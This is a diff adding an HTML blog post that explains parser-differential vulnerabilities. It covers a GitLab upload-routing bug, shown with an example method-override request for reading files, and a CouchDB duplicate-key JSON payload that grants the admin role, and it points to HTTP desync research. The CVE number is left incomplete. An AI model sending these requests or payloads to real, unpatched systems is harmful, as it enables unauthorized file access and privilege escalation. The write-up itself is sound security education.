@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>How to Exploit Parser Differentials - darkeydel</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #0d0d0d; color: #e0e0e0; line-height: 1.7; padding: 40px 20px; }
+    .container { max-width: 700px; margin: 0 auto; }
+    a { color: #4da6ff; text-decoration: none; }
+    a:hover { text-decoration: underline; }
+    header { padding-bottom: 20px; border-bottom: 1px solid #222; margin-bottom: 30px; }
+    header h1 { font-size: 24px; font-weight: 600; }
+    header a { color: #fff; text-decoration: none; }
+    header a:hover { text-decoration: none; }
+    nav { margin-top: 15px; }
+    nav a { color: #666; margin-right: 20px; font-size: 14px; }
+    nav a:hover { color: #999; }
+    .post-date { color: #555; font-size: 14px; margin-bottom: 20px; }
+    h2 { color: #fff; font-size: 20px; margin: 30px 0 15px; }
+    h3 { color: #ccc; font-size: 16px; margin: 20px 0 10px; }
+    code { background: #1a1a1a; padding: 2px 6px; border-radius: 3px; font-size: 14px; }
+    pre { background: #1a1a1a; padding: 15px; border-radius: 5px; overflow-x: auto; margin: 15px 0; }
+    pre code { background: none; padding: 0; }
+    blockquote { border-left: 3px solid #333; padding-left: 15px; color: #888; margin: 15px 0; }
+    ul, ol { margin: 15px 0; padding-left: 25px; }
+    li { margin: 5px 0; }
+    hr { border: none; border-top: 1px solid #222; margin: 30px 0; }
+    table { width: 100%; border-collapse: collapse; margin: 15px 0; }
+    th, td { border: 1px solid #333; padding: 10px; text-align: left; }
+    th { background: #1a1a1a; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <header>
+      <h1><a href="/">darkeydel</a></h1>
+      <nav><a href="/">Home</a></nav>
+    </header>
+    
+    <article>
+      <h1>How to Exploit Parser Differentials</h1>
+      <p class="post-date">January 15, 2024</p>
+      
+      <p>Parser differentials emerge when two (or more) parsers interpret the same input in different ways.</p>
+
+<blockquote>
+<p>Different interpretation of messages or data streams by components breaks any assumptions that components adhere to a shared specification and so introduces inconsistent state and unanticipated computation.</p>
+</blockquote>
+
+<h2 id="gitlab-file-upload-vulnerability">GitLab File Upload Vulnerability (CVE-2020-)</h2>
+
+<h3 id="file-uploads-in-gitlab">File Uploads in GitLab</h3>
+
+<p>To understand the file upload vulnerability we need to look at the involved components:</p>
+
+<ol>
+<li><strong>GitLab Workhorse</strong> - GitLab's reverse proxy that handles file uploads</li>
+<li><strong>GitLab Rails</strong> - The Ruby on Rails backend</li>
+</ol>
+
+<h3 id="how-it-works">How It Works</h3>
+
+<p>GitLab Workhorse receives file uploads and rewrites the request to pass the file path to GitLab Rails:</p>
+
+<pre><code>PUT /api/v4/packages/conan/v1/files/Hello/0.1/root+xxxxx/beta/0/export/conanfile.py</code></pre>
+
+<p>GitLab Workhorse modifies this to include file path information:</p>
+
+<pre><code>{
+  "key": "file.path",
+  "value": "/var/opt/gitlab/gitlab-rails/shared/packages/tmp/uploads/582573467"
+}</code></pre>
+
+<h3 id="the-parser-differential">The Parser Differential</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Component</th>
+      <th>What It Sees</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>GitLab Workhorse</strong></td>
+      <td><code>POST</code> or <code>PUT</code> request</td>
+    </tr>
+    <tr>
+      <td><strong>GitLab Rails</strong></td>
+      <td>Any HTTP method (via <code>Rack::MethodOverride</code>)</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>By using the <code>X-HTTP-Method-Override: PUT</code> header or <code>_method=PUT</code> parameter, attackers could bypass Workhorse routing!</p>
+
+<pre><code>POST /api/v4/packages/conan/v1/files/Hello/0.1/lol+wat/beta/0/export/conanmanifest.txt?file.size=4&file.path=/tmp/test1234
+X-HTTP-Method-Override: PUT</code></pre>
+
+<p>This allowed reading arbitrary files from the server's filesystem.</p>
+
+<h3 id="the-fix">The Fix</h3>
+
+<p>GitLab fixed this by <a href="https://gitlab.com/gitlab-org/gitlab-workhorse/-/commit/3a34323b104be89e92db49828268f0bfd831e75a">signing requests</a> that pass through Workhorse.</p>
+
+<hr />
+
+<h2 id="couchdb-rce">CouchDB RCE (Max Justicz)</h2>
+
+<p>CouchDB uses Erlang for document storage but allows JavaScript for validation:</p>
+
+<p><strong>Erlang (jiffy):</strong></p>
+<pre><code>jiffy:decode("{\"foo\":\"bar\", \"foo\":\"baz\"}")
+% Returns: {[{<<"foo">>,<<"bar">>},{<<"foo">>,<<"baz">>}]}</code></pre>
+
+<p><strong>JavaScript:</strong></p>
+<pre><code>JSON.parse("{\"foo\":\"bar\", \"foo\": \"baz\"}")
+% Returns: {foo: "baz"}</code></pre>
+
+<h3 id="payload-for-admin-access">Payload for Admin Access</h3>
+<pre><code>{
+  "type": "user",
+  "name": "oops",
+  "roles": ["admin"],
+  "roles": [],
+  "password": "password"
+}</code></pre>
+
+<p>Erlang sees <code>["admin"]</code> while JavaScript sees <code>[]</code>.</p>
+
+<hr />
+
+<h2 id="http-desync-attacks">HTTP Desync Attacks</h2>
+
+<p>The <a href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn">HTTP desync attack technique</a> is another form of parser differential.</p>
+
+<hr />
+
+<h2 id="why-this-matters">Why This Matters</h2>
+
+<p>The rise of microservices leads to complex environments where the same HTTP request might be interpreted by several different services in different ways - often with security implications.</p>
+
+<hr />
+
+<h2 id="references">References</h2>
+
+<ul>
+  <li><a href="https://about.gitlab.com/blog/how-to-exploit-parser-differentials/">How to exploit parser differentials</a></li>
+  <li><a href="https://justi.cz/security/2017/11/14/couchdb-rce-npm.html">CouchDB RCE</a></li>
+  <li><a href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn">HTTP Desync Attacks</a></li>
+</ul>
+
+    </article>
+  </div>
+</body>
+</html>
